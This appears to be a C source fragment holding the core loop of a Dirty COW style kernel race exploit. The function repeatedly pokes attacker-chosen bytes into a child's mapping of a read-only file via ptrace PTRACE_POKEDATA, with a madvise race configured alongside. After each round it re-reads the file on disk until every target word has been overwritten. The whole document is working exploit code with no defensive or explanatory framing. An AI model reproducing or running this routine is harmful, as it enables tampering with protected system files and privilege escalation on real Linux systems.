int parent_ride(int child_pid)
{
    short word_size = WORD_SIZE;
    int words_offset = g_parsed_arguments.data_offset;
    int words_number = g_parsed_arguments.data_size / word_size;
    int words_state[words_number];
    long words_in_file[words_number];
    unsigned long word_expected, word_in_file;
    int word_index, word_offset, words_tampered = 0;
    unsigned long ride_number = 0;
    int i;
    long pokedata_count = 0;

    for (word_index = 0; word_index < words_number; word_index++)
    {
        words_state[word_index] = 1; // to poke
    }

    fprintf(stderr, "\npage memory size: %d", sysconf(_SC_PAGE_SIZE));
    fprintf(stderr, "\nword size: %d", WORD_SIZE);
    fprintf(stderr, "\nride lenght: %d", g_ride_length);
    fprintf(stderr, "\nride interval: %d", g_ride_interval);
    fprintf(stderr, "\nmadvise interval: %d", g_madvise_interval);
    fprintf(stderr, "\n\nride num: words (1 to do, 0 done)");
    while (1)
    {
        for (word_index = 0; word_index < words_number; word_index++)
        {
            if (words_state[word_index])
            {
                usleep(g_ride_interval);
                word_offset = word_index * word_size;
                word_expected = *((long *)(g_parsed_arguments.data_bytes + word_offset));
                ride_number++;
                for (i = 0; i < g_ride_length; i++)
                {
                    ptrace(PTRACE_POKEDATA,
                           child_pid,
                           gp_file_memory_mapping + words_offset + (word_index * word_size),
                           word_expected);
                    g_pokedata_count++;
                }
            }
        }
        FILE *file = fopen(g_parsed_arguments.file_path, "rb");
        fseek(file, g_parsed_arguments.data_offset, SEEK_SET);
        fread(&words_in_file, word_size, words_number, file);
        fprintf(stderr, "\n%08d: ", ride_number);
        for (word_index = 0; word_index < words_number; word_index++)
        {
            if (words_state[word_index])
            {
                word_offset = word_index * word_size;
                word_expected = *((long *)(g_parsed_arguments.data_bytes + word_offset));
                word_in_file = words_in_file[word_index];
                if (word_index == words_number - 1 && g_parsed_arguments.offsets_delta)
                // shift dummy bytes if last data word overlap end of file
                {
                    word_expected = word_expected << (g_parsed_arguments.offsets_delta * 8);
                    word_in_file = word_in_file << (g_parsed_arguments.offsets_delta * 8);
                }
                if (word_expected == word_in_file)
                {
                    words_tampered++;
                    words_state[word_index] = 0;
                }
                //printf("%d %#lx %#lx\n", word_index, word_expected, word_in_file);
            }
            fprintf(stderr, "%ld ", words_state[word_index]);
        }
        fclose(file);
        // printf("\n%d %d\n", words_tampered, words_number);
        if (words_tampered == words_number)
        {
            break;
        }
    }
    return ride_number;
}
